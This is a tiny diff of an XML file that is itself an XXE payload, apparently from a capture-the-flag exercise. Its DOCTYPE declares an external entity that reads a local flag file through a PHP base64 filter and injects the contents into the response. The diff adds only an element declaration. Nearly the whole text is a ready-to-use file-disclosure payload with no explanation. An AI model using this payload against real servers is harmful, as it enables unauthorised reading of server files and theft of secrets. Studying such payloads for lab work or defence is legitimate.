@@ -1,4 +1,5 @@
 <?xml version="1.0"?>
 <!DOCTYPE foo [
+<!ELEMENT foo (#ANY)>
 <!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=file:///flag.txt">]>
 <foo><result>&ac;</result></foo>
